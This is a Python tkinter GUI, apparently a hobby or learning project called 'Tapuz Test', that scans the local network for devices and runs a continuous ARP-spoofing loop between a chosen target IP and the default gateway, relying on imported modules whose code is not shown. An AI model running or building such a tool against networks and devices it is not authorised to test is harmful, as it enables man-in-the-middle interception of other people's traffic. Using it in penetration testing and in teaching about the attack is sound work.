import tkinter as tk
from  tkinter import ttk
import ARP_spoofing  # Assuming this module has ARP spoofing functions
import FindGatewayIP  # Assuming this module finds the default gateway IP
import time
import IPAddressList


# Test command
def test():
    print('Hi, the test is working!')


# ARP spoofing command
def spoofing(target_IP):
    target_ip = target_IP
    gateway_ip = FindGatewayIP.get_default_gateway_ip()
    try:
        sent_packets_count = 0
        while(True):
            ARP_spoofing.spoof(target_ip, gateway_ip)
            ARP_spoofing.spoof(gateway_ip, target_IP)
            sent_packets_count = sent_packets_count + 2
            print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
            time.sleep(2)  # Waits for two seconds
    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        ARP_spoofing.restore(gateway_ip,target_ip)
        ARP_spoofing.restore(target_ip, gateway_ip)
        print("[+] Arp Spoof Stopped")


def get_selected_device_from_gui(window,devices):
    global ip_entry, selection_window  # Declare selection_window globally
    # Function to handle listbox selection and update main window IP entry
    def on_select(event):
      global ip_entry

      if listbox.curselection():  # Check if any item is selected
        selected_index = listbox.curselection()[0]
        selected_device = devices[selected_index]
        ip_entry.delete(0, tk.END)  # Clear any existing text
        ip_entry.insert(0, selected_device['ip'])  # Set the new IP
        try:
            selection_window.destroy()  # Close selection window
        except tk.TclError:
            pass

    # Create the selection window (use the globally declared variable)
    if not selection_window:  # Check if window exists to avoid duplicates
        selection_window = tk.Tk()

    # Set the window title
    selection_window.title("Tapuz Test - Select Device")

    # Set the window size
    selection_window.geometry("500x300")

    # Set window and listbox background color
    window_bg = '#333'  # Assuming dark gray

    # Set neon green text color for listbox
    listbox_text_color = '#39FF14'  # Replace with your preferred neon green code

    # Create a label widget
    label = ttk.Label(selection_window, text="Select a Device:")

    selection_window.configure(bg=window_bg)  # Set window background color
    label.configure(foreground='white', background=window_bg)  # Set label text and background color

    # Pack the label widget into the window
    label.pack(pady=20)

    # Create listbox with scrollbar
    listbox = tk.Listbox(selection_window, width=50)  # Increased width for listbox
    scrollbar = tk.Scrollbar(selection_window, orient=tk.VERTICAL, command=listbox.yview)
    listbox.config(yscrollcommand=scrollbar.set)
    listbox.configure(bg=window_bg, fg=listbox_text_color)
    # Bind the on_select function to the listbox selection event
    listbox.bind('<<ListboxSelect>>', on_select)

    # Pack listbox and scrollbar
    listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
    scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

    # Add each item to the listbox
    for device in devices:
        listbox.insert(tk.END, device)

    # Optional close button
    close_button = ttk.Button(selection_window, text="Close", command=selection_window.destroy)
    close_button.pack()

    # Run the main event loop (within the function)
    selection_window.mainloop()


def MainWindow(devices):
    global ip_entry, selection_window  # Declare ip_entry and selection_window globally

    def Test():
        ip = ip_entry.get()
        print("IP Address:", ip)
        spoofing(ip)

    def pick_device():
        get_selected_device_from_gui(selection_window,devices)  # Use the global variable

    # Create the main window
    window = tk.Tk()

    # Set the window title
    window.title("Tapuz Test")

    # Set the window size
    window.geometry("740x420")

    # Create a label widget
    label = ttk.Label(window, text="Tapuz Test ARP spoofing")

    window.configure(bg='#333')  # Set window background color
    label.configure(foreground='white', background='#333')  # Set label text and background color

    # Pack the label widget into the window
    label.pack(pady=50)

    # Create a label widget
    label = ttk.Label(window, text="Enter IP Address:")
    label.pack(pady=10)

    # Create an entry widget for the IP address
    ip_entry = ttk.Entry(window)
    ip_entry.pack(pady=10)

    # Create a button to run the Test function
    test_button = ttk.Button(window, text="Run Test", command=Test)

    # Pack the button widget into the window
    test_button.pack()

    select_button = ttk.Button(window, text="Pick Device", command=pick_device)
    select_button.pack()

    # Run the Tkinter event loop
    window.mainloop()


# MAIN starts here!
if __name__== "__main__":
    global ip_entry, selection_window
    ip_entry = None
    selection_window = None

    devices = IPAddressList.get_all_devices_on_network()  # Get devices list
    MainWindow(devices)  # Pass devices to MainWindow (optional)
